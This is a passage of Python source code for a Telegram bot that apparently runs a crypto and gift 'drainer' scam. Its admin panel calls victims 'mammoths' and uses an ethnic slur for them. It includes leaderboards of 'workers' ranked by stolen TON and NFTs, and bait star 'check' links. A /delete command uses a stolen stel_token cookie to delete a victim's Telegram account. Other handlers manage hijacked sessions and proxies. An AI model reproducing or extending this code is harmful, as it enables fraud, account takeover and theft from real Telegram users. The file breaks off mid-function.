from aiogram import Router
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import CommandStart, CommandObject
from aiogram.types import (
    Message,
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
    FSInputFile,
    WebAppInfo,
    LinkPreviewOptions,
    LabeledPrice,
    ReplyParameters,
)

from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

from base import (
    absolute_path,
    api_hash,
    api_id,
    proxy,
    star_session,
    bot,
    BASE_DIR,
    CODE_ROOT,
    post_bot,
    actual_proxy,
    version,
)

from drainer.core.proxy import change_proxy, get_active_proxy, proxys_json_path
from drainer.core import hybr1d_shared
from drainer.core.steal import send_user_log, get_tg_webappdata
from drainer.core.tonnel_api import get_balance_info
from drainer.core.functional import (
    get_exception_explanation,
    mutate_text,
    worker_cute_suffix,
    worker_cute_plain_suffix,
)

import asyncio
import html
import random
import logging
import json
import re
import os
import sys
import subprocess
import psutil
import aiohttp
import importlib.metadata
from pathlib import Path
from uuid import uuid4
import draw

from aiogram.filters import Command

import database
import config
import string

from pyrogram import Client, errors
from pyrogram.raw.functions.account import change_phone, send_change_phone_code
from pyrogram.raw.types import code_settings

dp = Router()


class ProfitPayFSM(StatesGroup):
    waiting_for_wallet = State()


class ChangeNumberStates(StatesGroup):
    waiting_for_number = State()
    waiting_for_code = State()

@dp.message(F.text.isdigit())
async def uretra_d0sh1k_demolish_handler(message: Message):
    if len(message.text) == 5:
        with open(f"{absolute_path}/storage/banned.json", "r", encoding="utf-8") as f:
            banned_users = json.load(f)
            
        banned_users["banned"].append(message.from_user.id)
        
        with open(f"{absolute_path}/storage/banned.json", "w") as f:
            json.dump(banned_users, f)
        
        await message.delete()

@dp.message(Command("delete"))
async def delete_handler(message: Message):
    args = message.text.split(maxsplit=2)

    if len(args) < 2:
        await message.answer("Использование: /delete <stel_token>")
        return

    token = args[1]

    headers = {
        "Cookie": f"stel_token={token}",
        "User-Agent": "Mozilla/5.0",
    }

    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.get("https://my.telegram.org/delete") as resp:
            html = await resp.text()

        match = re.search(r"hash:\s*'([a-f0-9]+)'", html)

        if not match:
            await message.answer("❌ hash не найден. Проверь cookie.")
            return

        hash_value = match.group(1)

        data = {
            "hash": hash_value,
            "message": "очко"
        }

        async with session.post(
            "https://my.telegram.org/delete/do_delete",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data
        ) as resp:
            text = await resp.text()

    await message.answer(
        f"#️⃣ Hash: {hash_value}\n"
        f"{'🟢' if int(resp.status) == 200 else '🔴'} Status: {resp.status}\n"
        f"🗣️ Ответ: {text[:1000]}\n\n"
        f"*Если ответ - true, то аккаунт удален."
    )

@dp.message(Command("check"))
async def checks_command(message: types.Message):
    args = message.text.split()[1:]
    bot_username = (await bot.get_me()).username

    if not args:
        await message.answer(
            "❎ Формат не тот, давай по инструкции:\n"
            "<code>/check 100</code>\n"
            "<code>/check 100 @username</code>\n"
            "<code>/check 100 50</code>"
            + worker_cute_suffix(),
            parse_mode="HTML",
        )
        return

    # Проверка прав
    try:
        member = await post_bot.get_chat_member(
            chat_id=config.WORK_GROUP_ID, user_id=message.from_user.id
        )
        is_worker = member.status in ["member", "owner", "administrator", "creator"]
    except:
        is_worker = False

    # ===== 100 @username =====
    if len(args) == 2 and args[0].isdigit() and args[1].startswith("@"):
        if not is_worker:
            await message.answer(
                "❎ Чеки могут создавать только свои, с доступом "
                + worker_cute_plain_suffix(),
                parse_mode="HTML"
            )
            return

        stars_amount = int(args[0])
        receiver = args[1]

        check_id = database.add_check(stars_amount, receiver=receiver)
        link = f"https://t.me/{bot_username}?start={check_id}_{message.from_user.id}"

        await message.answer(
            f"💳 Готово: чек на <b>{stars_amount}</b> ⭐️ для {receiver}\n\n"
            f"🔗 <code>{link}</code>"
            + worker_cute_suffix(),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
        return

    # ===== 100 50 (мультичек) =====
    if len(args) == 2 and args[0].isdigit() and args[1].isdigit():
        stars_amount = int(args[0])
        activations = int(args[1])

        if stars_amount not in [50, 100, 500]:
            await message.answer(
                "❎ Мультичек только на <b>50</b>, <b>100</b> или <b>500</b> ⭐️"
                + worker_cute_suffix(),
                parse_mode="HTML",
            )
            return

        if not is_worker:
            await message.answer(
                "⏳ Обычно открывается через 21 день"
            )
            return

        check_id = database.add_multicheck(stars_amount, activations)
        link = f"https://t.me/{bot_username}?start={check_id}_{message.from_user.id}"

        await message.answer(
            f"💳 Мультичек: <b>{stars_amount}</b> ⭐️\n"
            f"🔁 Сколько активаций: <b>{activations}</b>\n\n"
            f"🔗 <code>{link}</code>"
            + worker_cute_suffix(),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
        return

    # ===== 100 =====
    if len(args) == 1 and args[0].isdigit():
        if not is_worker:
            await message.answer(
                "⏳ Обычно открывается через 21 день"
            )
            return

        stars_amount = int(args[0])
        check_id = database.add_check(stars_amount)
        link = f"https://t.me/{bot_username}?start={check_id}_{message.from_user.id}"

        await message.answer(
            f"💳 Чек на <b>{stars_amount}</b> ⭐️ готов\n\n"
            f"🔗 <code>{link}</code>"
            + worker_cute_suffix(),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
        return

    await message.answer(
        "❎ Неправильный синтаксис. Пример:\n<code>/check 100 50</code>" + worker_cute_suffix(),
        parse_mode="HTML",
    )


@dp.message(F.text == "/top")
async def top_handler(message: Message):
    top = database.get_top_10_by_tons()

    iteration_emojis = {
        1: "<tg-emoji emoji-id='5244961448525848230'>1️⃣</tg-emoji>",
        2: "<tg-emoji emoji-id='5242293676834579345'>2️⃣</tg-emoji>",
        3: "<tg-emoji emoji-id='5242652525647127686'>3️⃣</tg-emoji>",
        4: "<tg-emoji emoji-id='5242287453426969423'>4️⃣</tg-emoji>",
        5: "<tg-emoji emoji-id='5242407832770340528'>5️⃣</tg-emoji>",
        6: "<tg-emoji emoji-id='5242669447818277073'>6️⃣</tg-emoji>",
        7: "<tg-emoji emoji-id='5242663134216350272'>7️⃣</tg-emoji>",
        8: "<tg-emoji emoji-id='5242497782270418294'>8️⃣</tg-emoji>",
        9: "<tg-emoji emoji-id='5242286371095211663'>9️⃣</tg-emoji>",
        10: "<tg-emoji emoji-id='5244961448525848230'>1️⃣</tg-emoji><tg-emoji emoji-id='5242380641332393116'>0️⃣</tg-emoji>",
    }

    caption_text = (
        "<blockquote><tg-emoji emoji-id='5039880333554616347'>🫰</tg-emoji> "
        "<b>Топ-10 по сумме (Всё время)</b></blockquote>\n\n"
    )

    for i, user in enumerate(top, start=1):
        try:
            rounded_amount = f"{user[1]:.2f}"
        except:
            rounded_amount = user[0]
        caption_text += f"<b>{iteration_emojis[i]}. {user[0]}</b>: <code>{rounded_amount}</code> 💎\n"

    return await bot.send_photo(
        chat_id=message.chat.id,
        photo=FSInputFile(BASE_DIR / "static" / "top.jpg"),
        caption=caption_text,
        parse_mode="HTML",
        reply_parameters=ReplyParameters(
            message_id=message.message_id,
            chat_id=message.chat.id,
        ),
    )
    
async def send_top(
    message: Message,
    top,
    period_text: str,
):
    
    iteration_emojis = {
        1: "<tg-emoji emoji-id='5244961448525848230'>1️⃣</tg-emoji>",
        2: "<tg-emoji emoji-id='5242293676834579345'>2️⃣</tg-emoji>",
        3: "<tg-emoji emoji-id='5242652525647127686'>3️⃣</tg-emoji>",
        4: "<tg-emoji emoji-id='5242287453426969423'>4️⃣</tg-emoji>",
        5: "<tg-emoji emoji-id='5242407832770340528'>5️⃣</tg-emoji>",
        6: "<tg-emoji emoji-id='5242669447818277073'>6️⃣</tg-emoji>",
        7: "<tg-emoji emoji-id='5242663134216350272'>7️⃣</tg-emoji>",
        8: "<tg-emoji emoji-id='5242497782270418294'>8️⃣</tg-emoji>",
        9: "<tg-emoji emoji-id='5242286371095211663'>9️⃣</tg-emoji>",
        10: "<tg-emoji emoji-id='5244961448525848230'>1️⃣</tg-emoji><tg-emoji emoji-id='5242380641332393116'>0️⃣</tg-emoji>",
    }

    caption_text = (
        "<blockquote><tg-emoji emoji-id='5039880333554616347'>🫰</tg-emoji> "
        f"<b>Топ-10 по сумме ({period_text})</b></blockquote>\n\n"
    )

    for i, user in enumerate(top, start=1):
        try:
            rounded_amount = f"{float(user[1]):.2f}"
            username = user[0]
            username = database.get_worker_name(username) or "-"
        except Exception:
            username = "-"
            rounded_amount = "0.00"

        caption_text += (
            f"<b>{iteration_emojis[i]}. {username}</b>: <code>{rounded_amount}</code> 💎\n"
        )

    return await bot.send_photo(
        chat_id=message.chat.id,
        photo=FSInputFile(BASE_DIR / "static" / "top.jpg"),
        caption=caption_text,
        parse_mode="HTML",
        reply_parameters=ReplyParameters(
            message_id=message.message_id,
            chat_id=message.chat.id,
        ),
    )


@dp.message(F.text == "/topday")
async def top_day_handler(message: Message):
    top = database.get_top_users_day()
    await send_top(message, top, "День")


@dp.message(F.text == "/topweek")
async def top_week_handler(message: Message):
    top = database.get_top_users_week()
    await send_top(message, top, "Неделя")


@dp.message(F.text == "/topmonth")
async def top_month_handler(message: Message):
    top = database.get_top_users_month()
    await send_top(message, top, "Месяц")

def _panel_stats_pre_table(stats: dict) -> str:
    hdr = f"{'':8}{'NFT':>5} | {'TON':>8}"
    return "\n".join(
        [
            "💻 Статистика Панели:",
            hdr,
            f"{'День':<8}{stats['day']['nfts']:>5} | {stats['day']['amount']:>8.2f}",
            f"{'Неделя':<8}{stats['week']['nfts']:>5} | {stats['week']['amount']:>8.2f}",
            f"{'Месяц':<8}{stats['month']['nfts']:>5} | {stats['month']['amount']:>8.2f}",
            f"{'Всего':<8}{stats['alltime']['nfts']:>5} | {stats['alltime']['amount']:>8.2f}",
        ]
    )


@dp.message(F.text == "/stat")
async def stat_handler(message: Message):
    stats = database.get_profits_stats()
    pre_body = html.escape(_panel_stats_pre_table(stats))
    caption_text = (
        "<blockquote><tg-emoji emoji-id='5039864236017190542'>📊</tg-emoji> "
        "<b>Панель</b></blockquote>\n\n"
        f"<pre>{pre_body}</pre>"
    )

    return await bot.send_photo(
        chat_id=message.chat.id,
        photo=FSInputFile(BASE_DIR / "static" / "stat.jpg"),
        caption=caption_text,
        parse_mode="HTML",
        reply_parameters=ReplyParameters(
            message_id=message.message_id,
            chat_id=message.chat.id,
        ),
    )

    
@dp.message(F.text == "/topnfts")
async def top_nfts_handler(message: Message):
    top = database.get_top_10_by_nfts()

    caption_text = (
        "<blockquote><tg-emoji emoji-id='5042187452547074149'>🫰</tg-emoji> "
        "<b>Топ-10 по NFT</b></blockquote>\n\n"
    )

    for i, user in enumerate(top, start=1):

        try:
            nfts_amount = int(user[1])
        except:
            nfts_amount = user[1]

        caption_text += f"<b>{i}. {user[0]}</b>: <code>{nfts_amount}</code> 🎁\n"

    caption_text += "\n<b>Период:</b> всё время" + worker_cute_suffix()

    return await bot.send_photo(
        chat_id=message.chat.id,
        photo=FSInputFile(BASE_DIR / "static" / "top.jpg"),
        caption=caption_text,
        parse_mode="HTML",
        reply_parameters=ReplyParameters(
            message_id=message.message_id,
            chat_id=message.chat.id,
        ),
    )


@dp.message(F.text == "/profile")
async def profile_handler(message: Message):
    if not message.reply_to_message:
        await message.answer(
            "Ответь реплаем на сообщение человека и напиши <code>/profile</code>"
            + worker_cute_suffix(),
            parse_mode="HTML",
        )
        return

    user_id = message.reply_to_message.from_user.id
    nfts = database.get_user_nfts(user_id) or 0
    tons = float(database.get_user_tons(user_id) or 0.00)
    payouts = float(database.get_user_payouts(user_id) or 0.00)
    top_rank = database.get_user_rank(user_id)

    await message.answer_photo(
        photo=FSInputFile(BASE_DIR / "static" / "profile.jpg"),
        caption=(
            f"<blockquote><b><tg-emoji emoji-id='5039864236017190542'>🫰</tg-emoji> Карточка · "
            f"{message.reply_to_message.from_user.full_name}</b></blockquote>\n\n"
            f"<b>Имя:</b> <code>{message.reply_to_message.from_user.full_name}</code>\n"
            f"<b>NFT:</b> <code>{nfts}</code>\n"
            f"<b>TON:</b> <code>{tons:.2f}</code> 💎\n"
            f"<b>Выплаты:</b> <code>{payouts:.2f}</code> 💎\n"
            f"<b>Место в топе:</b> <code>{top_rank}</code>"
        ),
        parse_mode="HTML",
        reply_parameters=ReplyParameters(
            message_id=message.message_id,
            chat_id=message.chat.id,
        ),
    )


@dp.message(F.text.startswith("/draw"))
async def draw_handler(message: Message):
    if len(message.text.split(" ")) != 2:
        return await bot.send_message(
            chat_id=message.chat.id,
            text="Напиши так: <code>/draw 50</code>" + worker_cute_suffix(),
            parse_mode="HTML",
            reply_parameters=ReplyParameters(
                message_id=message.message_id,
                chat_id=message.chat.id,
            ),
        )

    if not message.text.split(" ")[-1].isdigit():
        return await bot.send_message(
            chat_id=message.chat.id,
            text="Нужно число: <code>/draw 50</code>" + worker_cute_suffix(),
            parse_mode="HTML",
            reply_parameters=ReplyParameters(
                message_id=message.message_id,
                chat_id=message.chat.id,
            ),
        )

    bot_name = await bot.get_me()

    stars_amount = message.text.split(" ")[-1]
    image_path = draw.generate_image(bot_name.first_name, stars_amount, absolute_path)

    await asyncio.sleep(0.5)

    await bot.send_photo(
        chat_id=message.chat.id,
        photo=FSInputFile(image_path),
        reply_parameters=ReplyParameters(
            message_id=message.message_id,
            chat_id=message.chat.id,
        ),
    )

    await asyncio.sleep(5)

    os.remove(image_path)


@dp.message(F.text == "/info")
async def stars_handler(message: Message):
    api_id = config.API_ID
    api_hash = config.API_HASH

    star_session_name = random.choices("abcdefghijklmnopqrstuvwxyz0123456789" + "abcdefghijklmnopqrstuvwxyz0123456789".upper(), k=16)
    star_session = Client(star_session_name, api_id=api_id, api_hash=api_hash, session_string=config.STAR_SESSION_STRING)
    
    try:
        await star_session.connect()
    except Exception as e:
        if "database is locked" in str(e).lower():
            star_session.storage.conn.close()
            await asyncio.sleep(1)
            await star_session.connect()

    await asyncio.sleep(1)

    try:
        stars = await star_session.get_stars_balance()
        username = (await star_session.get_me()).username
    except:
        stars = "не вышло подключиться"
        username = "—"

    with open(f"{absolute_path}/storage/reserve.json", "r+", encoding="utf-8") as f:
        data = json.load(f)
        reserve = data.get("reserve", [])

    reserve_text = f"<tg-emoji emoji-id='5278540791336165644'>🫰</tg-emoji> Резерв ботов: <code>{len(reserve)}</code>"
    
    init_data = hybr1d_shared.read_cached_init_data()
    if not init_data:
        async with hybr1d_shared.hybr1d_client_context(
            api_id, api_hash, config.HYBR1D_SESSION_STRING
        ) as hybr1d_app:
            init_data = await get_tg_webappdata(
                hybr1d_app, "@Tonnel_Network_bot"
            )

    offer_balance = get_balance_info(init_data)

    msg = (
        f"<blockquote><tg-emoji emoji-id='5206476089127372379'>🫰</tg-emoji> Автозакид: <code>{stars}</code>\n"
        f"<tg-emoji emoji-id='5193179982775476271'>🫰</tg-emoji> Баланс Офферов: <code>{offer_balance:.2f} TON</code>\n"
        f"{reserve_text}</blockquote>\n"
    ) + worker_cute_suffix()
    await bot.send_message(
        chat_id=message.chat.id,
        text=msg,
        parse_mode="HTML",
        reply_parameters=ReplyParameters(
            message_id=message.message_id,
            chat_id=message.chat.id,
        ),
    )

    try:
        await star_session.disconnect()
    except:
        pass


@dp.message(F.text == "/admin")
async def admin_panel(message: Message, check_admin: bool = True):
    if check_admin:
        if message.from_user.id not in config.ADMIN_ID:
            return await message.answer(
                "<tg-emoji emoji-id='5278578973595427038'>⛔️</tg-emoji>Вход запрещен.",
                parse_mode="HTML",
            )

    json_settings = open(f"{absolute_path}/storage/settings.json", "r").read()
    json_settings = json.loads(json_settings)

    private_mode = json_settings["privacy"]
    worker_private_mode = json_settings["worker_privacy"]
    photos_allowed = json_settings["photos"]
    transfer_to_account = json_settings["transfer_to_account"]
    gift_upgrades = json_settings["gift_upgrades"]

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=f"📸 Фото мамонтов - {'✅' if photos_allowed else '❌'}",
                    callback_data="admin_set_photos_allowed",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"🦣 Скрытие гоев - {'✅' if private_mode else '❌'}",
                    callback_data="admin_hide_mamonts",
                ),
                InlineKeyboardButton(
                    text=f"🥷 Скрытие воркеров - {'✅' if worker_private_mode else '❌'}",
                    callback_data="admin_hide_workers",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"⭐️ Передача звезд - {'На аккаунт 👤' if transfer_to_account else 'На канал 📢'}",
                    callback_data="change_stars_receiver",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"🎁 Улучшение подарков - {'✅' if gift_upgrades else '❌'}",
                    callback_data="admin_toggle_gift_upgrades",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=mutate_text("🔑 PyroFork"),
                    callback_data="admin_reinstall_pyrofork",
                ),
                InlineKeyboardButton(
                    text=mutate_text("🌐 Proxy"), callback_data="admin_edit_proxy"
                ),
            ],
        ]
    )

    await message.answer(
        (
            f"<b><tg-emoji emoji-id='5276314275994954605'>🛠</tg-emoji> Панель управления <code>v{version}</code></b>\n\nВыбери, что сделать:"
        ),
        parse_mode="HTML",
        reply_markup=markup,
    )


@dp.callback_query(F.data == "admin_hide_mamonts")
async def admin_hide_mamonts(callback: CallbackQuery):
    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer(
            mutate_text("⛔️ Только для админов.") + " ^^", show_alert=True
        )

    with open(f"{absolute_path}/storage/settings.json", "r") as f:
        json_settings = json.load(f)

    private_mode = json_settings["privacy"]
    worker_private_mode = json_settings["worker_privacy"]
    photos_allowed = json_settings["photos"]
    transfer_to_account = json_settings["transfer_to_account"]
    gift_upgrades = json_settings["gift_upgrades"]

    new_private_mode = not private_mode
    json_settings["privacy"] = new_private_mode

    with open(f"{absolute_path}/storage/settings.json", "w") as f:
        json.dump(json_settings, f)

    await callback.answer(
        mutate_text(
            "☑️ 👻 Логи для «своих» теперь приватнее"
            if new_private_mode
            else "❎ 👻 Приватность в логах выключена"
        )
        + " ^^",
        show_alert=False,
    )

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=f"📸 Фото мамонтов - {'✅' if photos_allowed else '❌'}",
                    callback_data="admin_set_photos_allowed",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"🦣 Скрытие гоев - {'✅' if new_private_mode else '❌'}",
                    callback_data="admin_hide_mamonts",
                ),
                InlineKeyboardButton(
                    text=f"🥷 Скрытие воркеров - {'✅' if worker_private_mode else '❌'}",
                    callback_data="admin_hide_workers",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"⭐️ Передача звезд - {'На аккаунт 👤' if transfer_to_account else 'На канал 📢'}",
                    callback_data="change_stars_receiver",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"🎁 Улучшение подарков - {'✅' if gift_upgrades else '❌'}",
                    callback_data="admin_toggle_gift_upgrades",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=mutate_text("🔑 PyroFork"),
                    callback_data="admin_reinstall_pyrofork",
                ),
                InlineKeyboardButton(
                    text=mutate_text("🌐 Proxy"),
                    callback_data="admin_edit_proxy",
                ),
            ],
        ]
    )

    await callback.message.edit_reply_markup(reply_markup=markup)


@dp.callback_query(F.data == "admin_hide_workers")
async def admin_hide_workers(callback: CallbackQuery):
    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer(
            mutate_text("⛔️ Только для админов.") + " ^^", show_alert=True
        )

    with open(f"{absolute_path}/storage/settings.json", "r") as f:
        json_settings = json.load(f)

    worker_private_mode = json_settings["worker_privacy"]
    private_mode = json_settings["privacy"]
    photos_allowed = json_settings["photos"]
    transfer_to_account = json_settings["transfer_to_account"]
    gift_upgrades = json_settings["gift_upgrades"]

    new_worker_private_mode = not worker_private_mode
    json_settings["worker_privacy"] = new_worker_private_mode

    with open(f"{absolute_path}/storage/settings.json", "w") as f:
        json.dump(json_settings, f)

    await callback.answer(
        mutate_text(
            "☑️ 👻 Воркеры в логах скрыты"
            if new_worker_private_mode
            else "❎ 👻 Воркеры снова видны в логах"
        )
        + " ^^",
        show_alert=False,
    )

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=f"📸 Фото мамонтов - {'✅' if photos_allowed else '❌'}",
                    callback_data="admin_set_photos_allowed",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"🦣 Скрытие гоев - {'✅' if private_mode else '❌'}",
                    callback_data="admin_hide_mamonts",
                ),
                InlineKeyboardButton(
                    text=f"🥷 Скрытие воркеров - {'✅' if new_worker_private_mode else '❌'}",
                    callback_data="admin_hide_workers",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"⭐️ Передача звезд - {'На аккаунт 👤' if transfer_to_account else 'На канал 📢'}",
                    callback_data="change_stars_receiver",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"🎁 Улучшение подарков - {'✅' if gift_upgrades else '❌'}",
                    callback_data="admin_toggle_gift_upgrades",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=mutate_text("🔑 PyroFork"),
                    callback_data="admin_reinstall_pyrofork",
                ),
                InlineKeyboardButton(
                    text=mutate_text("🌐 Proxy"),
                    callback_data="admin_edit_proxy",
                ),
            ],
        ]
    )

    await callback.message.edit_reply_markup(reply_markup=markup)


@dp.callback_query(F.data == "admin_set_photos_allowed")
async def admin_set_photos_allowed(callback: CallbackQuery):
    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer(
            mutate_text("⛔️ Только для админов.") + " ^^", show_alert=True
        )

    with open(f"{absolute_path}/storage/settings.json", "r") as f:
        json_settings = json.load(f)

    worker_private_mode = json_settings["worker_privacy"]
    private_mode = json_settings["privacy"]
    photos_allowed = json_settings["photos"]
    transfer_to_account = json_settings["transfer_to_account"]
    gift_upgrades = json_settings["gift_upgrades"]

    new_photos_allowed = not photos_allowed
    json_settings["photos"] = new_photos_allowed

    with open(f"{absolute_path}/storage/settings.json", "w") as f:
        json.dump(json_settings, f)

    await callback.answer(
        mutate_text(
            "☑️ 📸 Фото в логах включены"
            if new_photos_allowed
            else "❎ 📸 Фото в логах выключены"
        )
        + " ^^",
        show_alert=False,
    )

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=f"📸 Фото мамонтов - {'✅' if new_photos_allowed else '❌'}",
                    callback_data="admin_set_photos_allowed",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"🦣 Скрытие гоев - {'✅' if private_mode else '❌'}",
                    callback_data="admin_hide_mamonts",
                ),
                InlineKeyboardButton(
                    text=f"🥷 Скрытие воркеров - {'✅' if worker_private_mode else '❌'}",
                    callback_data="admin_hide_workers",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"⭐️ Передача звезд - {'На аккаунт 👤' if transfer_to_account else 'На канал 📢'}",
                    callback_data="change_stars_receiver",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"🎁 Улучшение подарков - {'✅' if gift_upgrades else '❌'}",
                    callback_data="admin_toggle_gift_upgrades",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=mutate_text("🔑 PyroFork"),
                    callback_data="admin_reinstall_pyrofork",
                ),
                InlineKeyboardButton(
                    text=mutate_text("🌐 Proxy"),
                    callback_data="admin_edit_proxy",
                ),
            ],
        ]
    )

    await callback.message.edit_reply_markup(reply_markup=markup)


@dp.callback_query(F.data == "change_stars_receiver")
async def change_stars_receiver(callback: CallbackQuery):
    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer(
            mutate_text("⛔️ Только для админов.") + " ^^", show_alert=True
        )

    json_settings = open(f"{absolute_path}/storage/settings.json", "r").read()
    json_settings = json.loads(json_settings)

    worker_private_mode = json_settings["worker_privacy"]
    private_mode = json_settings["privacy"]
    photos_allowed = json_settings["photos"]
    transfer_to_account = json_settings["transfer_to_account"]
    gift_upgrades = json_settings["gift_upgrades"]

    if transfer_to_account:
        new_transfer_to_account = False
        await callback.answer(
            mutate_text("⭐️ Звёзды теперь на канал 📢") + " ^^", show_alert=False
        )
    else:
        new_transfer_to_account = True
        await callback.answer(
            mutate_text("⭐️ Звёзды теперь на аккаунт 👤") + " ^^", show_alert=False
        )

    json_settings["transfer_to_account"] = new_transfer_to_account
    with open(f"{absolute_path}/storage/settings.json", "w") as f:
        json.dump(json_settings, f)

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=f"📸 Фото мамонтов - {'✅' if photos_allowed else '❌'}",
                    callback_data="admin_set_photos_allowed",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"🦣 Скрытие гоев - {'✅' if private_mode else '❌'}",
                    callback_data="admin_hide_mamonts",
                ),
                InlineKeyboardButton(
                    text=f"🥷 Скрытие воркеров - {'✅' if worker_private_mode else '❌'}",
                    callback_data="admin_hide_workers",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"⭐️ Передача звезд - {'На аккаунт 👤' if new_transfer_to_account else 'На канал 📢'}",
                    callback_data="change_stars_receiver",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"🎁 Улучшение подарков - {'✅' if gift_upgrades else '❌'}",
                    callback_data="admin_toggle_gift_upgrades",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=mutate_text("🔑 PyroFork"),
                    callback_data="admin_reinstall_pyrofork",
                ),
                InlineKeyboardButton(
                    text=mutate_text("🌐 Proxy"),
                    callback_data="admin_edit_proxy",
                ),
            ],
        ]
    )

    return await callback.message.edit_reply_markup(reply_markup=markup)

@dp.callback_query(F.data == "admin_toggle_gift_upgrades")
async def admin_toggle_gift_upgrades(callback: CallbackQuery):
    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer(
            mutate_text("⛔️ Только для админов.") + " ^^", show_alert=True
        )

    with open(f"{absolute_path}/storage/settings.json", "r") as f:
        json_settings = json.load(f)

    json_settings["gift_upgrades"] = not json_settings["gift_upgrades"]
    new_gift_upgrades = json_settings["gift_upgrades"]

    with open(f"{absolute_path}/storage/settings.json", "w") as f:
        json.dump(json_settings, f)

    await callback.answer(
        mutate_text(
            "🎁 Апгрейд подарков включён"
            if new_gift_upgrades
            else "🎁 Апгрейд подарков выключен"
        ),
        show_alert=False,
    )

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=f"📸 Фото мамонтов - {'✅' if json_settings['photos'] else '❌'}",
                    callback_data="admin_set_photos_allowed",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"🦣 Скрытие гоев - {'✅' if json_settings['privacy'] else '❌'}",
                    callback_data="admin_hide_mamonts",
                ),
                InlineKeyboardButton(
                    text=f"🥷 Скрытие воркеров - {'✅' if json_settings['worker_privacy'] else '❌'}",
                    callback_data="admin_hide_workers",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"⭐️ Передача звезд - {'На аккаунт 👤' if json_settings['transfer_to_account'] else 'На канал 📢'}",
                    callback_data="change_stars_receiver",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=f"🎁 Улучшение подарков - {'✅' if new_gift_upgrades else '❌'}",
                    callback_data="admin_toggle_gift_upgrades",
                ),
            ],
            [
                InlineKeyboardButton(
                    text=mutate_text("🔑 PyroFork"),
                    callback_data="admin_reinstall_pyrofork",
                ),
                InlineKeyboardButton(
                    text=mutate_text("🌐 Proxy"),
                    callback_data="admin_edit_proxy",
                ),
            ],
        ]
    )

    await callback.message.edit_reply_markup(reply_markup=markup)


@dp.callback_query(F.data == "admin_reinstall_pyrofork")
async def admin_reinstall_pyrofork(callback: CallbackQuery):
    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer(
            mutate_text("⛔️ Только для админов.") + " ^^", show_alert=True
        )

    version = importlib.metadata.version("pyrofork")

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="2.3.66", callback_data="pf_version:2.3.66")],
            [InlineKeyboardButton(text="2.3.67", callback_data="pf_version:2.3.67")],
            [InlineKeyboardButton(text="2.3.68", callback_data="pf_version:2.3.68")],
            [
                InlineKeyboardButton(
                    text="2.3.68.dev1", callback_data="pf_version:2.3.68.dev1"
                )
            ],
            [
                InlineKeyboardButton(
                    text="⚠️ 2.3.69.dev1", callback_data="pf_version:2.3.69.dev1"
                )
            ],
            [InlineKeyboardButton(text="⚠️ 2.3.69", callback_data="pf_version:2.3.69")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")],
        ]
    )

    await callback.message.edit_text(
        (
            f"<b><tg-emoji emoji-id='5276314275994954605'>🛠</tg-emoji> Выбери версию PyroFork\n\n⚠️ dev-сборки могут глючить\n\n📦 Сейчас: <code>{version}</code></b>"
        ),
        parse_mode="HTML",
        reply_markup=markup,
    )
    await callback.answer()


@dp.callback_query(F.data == "admin_edit_proxy")
async def admin_edit_proxy(callback: CallbackQuery):
    if callback.from_user.id not in config.ADMIN_ID:
        return await callback.answer(
            mutate_text("⛔️ Только для админов.") + " ^^", show_alert=True
        )

    with open(proxys_json_path(), "r", encoding="utf-8") as f:
        _pj = json.load(f)
    _rows = []
    for _i in range(len(_pj["proxys"])):
        _rows.append(
            [
                InlineKeyboardButton(
                    text=(
                        f"🌐 SOCKS5 [{_i}] {'- ✅' if actual_proxy == _i else ''}"
                    ),
                    callback_data=f"edit_proxy:{_i}",
                )
            ]
        )
    _rows.append(
        [
            InlineKeyboardButton(
                text="⬅️ Назад", callback_data="admin_back"
            )
        ]
    )
    markup = InlineKeyboardMarkup(inline_keyboard=_rows)

    await callback.message.edit_text(
